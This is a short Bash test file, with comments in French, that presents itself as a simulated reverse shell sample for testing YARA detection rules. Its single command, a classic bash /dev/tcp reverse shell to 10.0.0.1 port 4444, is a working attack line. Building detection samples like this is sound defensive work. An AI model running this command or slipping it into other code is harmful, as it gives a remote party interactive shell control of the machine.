#!/bin/bash
# FICHIER DE TEST - Reverse shell Bash simulé
# Ce fichier est un EXEMPLE pour tester la détection YARA

# Reverse shell classique via /dev/tcp
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
